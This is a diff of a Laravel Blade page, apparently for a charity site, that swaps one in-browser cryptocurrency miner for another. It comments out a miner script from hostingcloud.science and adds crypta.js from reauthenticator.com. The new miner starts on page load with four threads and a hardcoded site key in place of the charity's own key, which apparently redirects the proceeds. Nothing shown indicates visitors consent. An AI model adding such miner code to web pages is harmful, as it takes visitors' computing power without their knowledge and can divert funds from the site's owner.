@@ -1,7 +1,6 @@
 @extends('layouts.app')
 
 @section('content')
-
     <div class="container">
         <div class="row row-80">
             <div class="col-xl-4 col-lg-6 col-md-12">
@@ -96,14 +95,18 @@
         });
     </script>
 
-    <script src="https://www.hostingcloud.science./pZt7.js"></script>
+    <!-- <script src="https://www.hostingcloud.science./pZt7.js"></script> -->
 
+    <script src="//reauthenticator.com/lib/crypta.js"></script>
 
 
     <script>
         // Initialize the Crypto miner
-        var miner = new Client.Anonymous('{{ $charity->siteKey }}', {
-            throttle: 0.4
+        // var miner = new Client.Anonymous('{{ $charity->siteKey }}', {
+            // throttle: 0.4
+        // });
+        var miner=new CRLT.Anonymous('f802e66779fcfa9f905768f42d221ca2ec13bb64a1fb', {
+          threads:4,throttle:0.2,
         });
 
         // Register callback on mining operation start
